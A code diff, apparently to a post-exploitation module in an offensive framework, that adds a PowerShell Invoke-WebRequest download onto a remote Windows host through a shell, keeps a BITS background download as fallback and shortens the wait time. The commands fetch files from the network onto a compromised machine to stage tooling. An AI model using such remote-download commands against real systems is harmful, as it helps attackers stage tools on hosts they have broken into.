@@ -189,6 +189,32 @@ class Module(Post):
 
             print_status(f"Downloading from {python_url}")
             print_status(f"Saving to: {file_path_abs}")
+
+            # Try Invoke-WebRequest first (synchronous, works in remote shells; timeout 120s)
+            print_status("Trying Invoke-WebRequest (synchronous)...")
+            iwr_cmd = (
+                'powershell -NoProfile -Command "'
+                'try { '
+                'Invoke-WebRequest -Uri \'' + python_url + '\' -OutFile \'' + file_path_abs + '\' -UseBasicParsing -TimeoutSec 120; '
+                'exit 0 '
+                '} catch { Write-Output (\"ERR:\" + $_.Exception.Message); exit 1 }"'
+            )
+            iwr_result = self._execute_cmd(iwr_cmd, timeout=130)
+            if self._file_exists(file_path_abs):
+                size_cmd = 'powershell -Command "(Get-Item \'' + file_path_abs + '\').Length"'
+                sr = self._execute_cmd(size_cmd, timeout=5)
+                if sr:
+                    try:
+                        file_size = int(sr.strip())
+                        if file_size > 1000000:
+                            print_success(f"Downloaded ({file_size / (1024*1024):.2f} MB)")
+                            return True
+                    except ValueError:
+                        pass
+            if iwr_result and "ERR:" in (iwr_result or ""):
+                print_warning("Invoke-WebRequest failed: " + (iwr_result or "").strip()[:200])
+
+            # Fallback: BITS (background; often fails in non-interactive/remote context)
             print_status("Trying background download (BITS)...")
             bits_cmd = (
                 'start /B powershell -NoProfile -Command '
@@ -196,8 +222,8 @@ class Module(Post):
             )
             self._execute_cmd(bits_cmd, timeout=10)
 
-            print_status("Waiting for download (up to 5 min)...")
-            max_wait = 300
+            print_status("Waiting for download (up to 2 min)...")
+            max_wait = 120
             check_interval = 3
             waited = 0
             while waited < max_wait:
